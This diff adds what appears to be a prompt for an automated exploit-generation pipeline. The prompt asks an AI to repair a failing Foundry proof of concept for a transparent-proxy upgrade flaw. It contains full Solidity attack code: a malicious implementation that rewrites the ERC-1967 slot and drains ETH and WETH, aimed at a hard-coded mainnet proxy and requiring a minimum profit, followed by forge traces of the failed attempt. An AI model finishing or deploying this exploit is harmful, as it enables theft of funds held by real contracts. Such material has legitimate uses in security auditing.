@@ -1,0 +1,229 @@
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Finding:
+- title: Transparent proxies can retain a second upgrade path when paired with implementation-side upgrade logic
+- claim: `TransparentUpgradeableProxy` only intercepts admin calls; every non-admin call is delegated to the implementation. Because transparent proxies and implementation-side upgrade patterns such as UUPS mutate the same ERC-1967 implementation slot, any upgrade entrypoint exposed by the implementation remains callable through the proxy by non-admin users and can change the proxy implementation outside the `ProxyAdmin` surface.
+- impact: A deployment that assumes `ProxyAdmin` is the sole upgrade authority can accidentally leave a parallel upgrade surface reachable through the implementation. If the implementation's upgrade authorization is weak, bypassable, or left uninitialized, an attacker can replace the proxy logic and seize proxy-held assets or permissions.
+- exploit_paths: ["A `TransparentUpgradeableProxy` is deployed pointing at an implementation that exposes `upgradeTo`/`upgradeToAndCall`-style logic.", "A non-admin caller invokes that implementation-defined upgrade function through the proxy, so `TransparentUpgradeableProxy._fallback()` forwards the call instead of handling it as an admin action.", "The implementation-side upgrade routine writes the shared ERC-1967 implementation slot, changing proxy logic without going through `ProxyAdmin`."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETHLike is IERC20Like {
+    function withdraw(uint256 amount) external;
+}
+
+contract ProxyEscapeImplementation {
+    bytes32 internal constant IMPLEMENTATION_SLOT =
+        0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC;
+
+    receive() external payable {}
+
+    function proxiableUUID() external pure returns (bytes32) {
+        return IMPLEMENTATION_SLOT;
+    }
+
+    function drain(address payable receiver, address weth) external {
+        uint256 nativeBalance = address(this).balance;
+        if (nativeBalance != 0) {
+            (bool ok,) = receiver.call{value: nativeBalance}("");
+            require(ok, "native drain failed");
+        }
+
+        if (weth != address(0)) {
+            uint256 wethBalance = IERC20Like(weth).balanceOf(address(this));
+            if (wethBalance != 0) {
+                require(IERC20Like(weth).transfer(receiver, wethBalance), "weth drain failed");
+            }
+        }
+    }
+
+    function upgradeTo(address newImplementation) external {
+        assembly {
+            sstore(IMPLEMENTATION_SLOT, newImplementation)
+        }
+    }
+
+    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable {
+        assembly {
+            sstore(IMPLEMENTATION_SLOT, newImplementation)
+        }
+        (bool ok,) = address(this).delegatecall(data);
+        require(ok, "post-upgrade call failed");
+    }
+}
+
+contract FlawVerifier {
+    address internal constant TARGET_PROXY = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    uint256 internal constant MIN_REQUIRED_PROFIT = 0.1 ether;
+
+    address internal realizedProfitToken;
+    uint256 internal realizedProfitAmount;
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        uint256 nativeBefore = address(this).balance;
+        uint256 wethBefore = _balanceOf(WETH, address(this));
+
+        ProxyEscapeImplementation maliciousImplementation = new ProxyEscapeImplementation();
+        bytes memory drainCalldata = abi.encodeWithSelector(
+            ProxyEscapeImplementation.drain.selector,
+            payable(address(this)),
+            WETH
+        );
+
+        // Path alignment for F-001:
+        // 1) a `TransparentUpgradeableProxy` can still expose implementation-defined `upgradeTo` /
+        //    `upgradeToAndCall` selectors to non-admin callers;
+        // 2) the non-admin call reaches the implementation because `TransparentUpgradeableProxy._fallback()`
+        //    delegates instead of routing through `ProxyAdmin`;
+        // 3) that implementation-side routine writes the shared ERC-1967 implementation slot.
+        // The realistic economic step layered on top is an immediate delegatecalled drain of proxy-held ETH/WETH.
+
+        bool upgraded = _tryUpgradeToAndCall(address(maliciousImplementation), drainCalldata);
+        if (!upgraded) {
+            upgraded = _tryUpgradeTo(address(maliciousImplementation));
+            if (upgraded) {
+                (bool drained,) = TARGET_PROXY.call(
+                    abi.encodeWithSelector(ProxyEscapeImplementation.drain.selector, payable(address(this)), WETH)
+                );
+                require(drained, "drain through upgraded proxy failed");
+            }
+        }
+
+        require(upgraded, "implementation-side upgrade path unavailable");
+
+        uint256 wethAfter = _balanceOf(WETH, address(this));
+        if (wethAfter > wethBefore) {
+            IWETHLike(WETH).withdraw(wethAfter - wethBefore);
+        }
+
+        realizedProfitToken = address(0);
+        realizedProfitAmount = address(this).balance - nativeBefore;
+        require(realizedProfitAmount >= MIN_REQUIRED_PROFIT, "profit below threshold");
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfitAmount;
+    }
+
+    function _tryUpgradeToAndCall(address newImplementation, bytes memory data) internal returns (bool) {
+        (bool ok,) = TARGET_PROXY.call(
+            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", newImplementation, data)
+        );
+        return ok;
+    }
+
+    function _tryUpgradeTo(address newImplementation) internal returns (bool) {
+        (bool ok,) = TARGET_PROXY.call(abi.encodeWithSignature("upgradeTo(address)", newImplementation));
+        return ok;
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
+        (bool ok, bytes memory data) = token.staticcall(
+            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
+        );
+        if (ok && data.length >= 32) {
+            balance = abi.decode(data, (uint256));
+        }
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+Compiling 2 files with Solc 0.8.30
+Solc 0.8.30 finished in 923.75ms
+Compiler run successful with warnings:
+Warning (2072): Unused local variable.
+  --> test/ExploitPOC.t.sol:74:19:
+   |
+74 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
+   |                   ^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: exploit call reverted] testExploit() (gas: 280163)
+Traces:
+  [280163] FlawVerifierTest::testExploit()
+    ├─ [2296] FlawVerifier::profitToken() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ [271353] FlawVerifier::executeOnOpportunity()
+    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [214663] → new ProxyEscapeImplementation@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 1072 bytes of code
+    │   ├─ [7442] 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710::upgradeToAndCall(ProxyEscapeImplementation: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 0x837971e40000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
+    │   │   ├─ [257] 0x3747484567119592fF6841df399cf679955A111A::upgradeToAndCall(ProxyEscapeImplementation: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 0x837971e40000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [delegatecall]
+    │   │   │   └─ ← [Revert] EvmError: Revert
+    │   │   └─ ← [Revert] EvmError: Revert
+    │   ├─ [7394] 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710::upgradeTo(ProxyEscapeImplementation: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   ├─ [236] 0x3747484567119592fF6841df399cf679955A111A::upgradeTo(ProxyEscapeImplementation: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [delegatecall]
+    │   │   │   └─ ← [Revert] EvmError: Revert
+    │   │   └─ ← [Revert] EvmError: Revert
+    │   └─ ← [Revert] implementation-side upgrade path unavailable
+    └─ ← [Revert] exploit call reverted
+
+Backtrace:
+  at 0x3747484567119592fF6841df399cf679955A111A.upgradeTo
+  at 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710.upgradeTo
+  at FlawVerifier.executeOnOpportunity
+  at FlawVerifierTest.testExploit
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 230.01ms (3.12ms CPU time)
+
+Ran 1 test suite in 310.48ms (230.01ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: exploit call reverted] testExploit() (gas: 280163)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+
+```
+
+forge stderr (tail):
+```
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
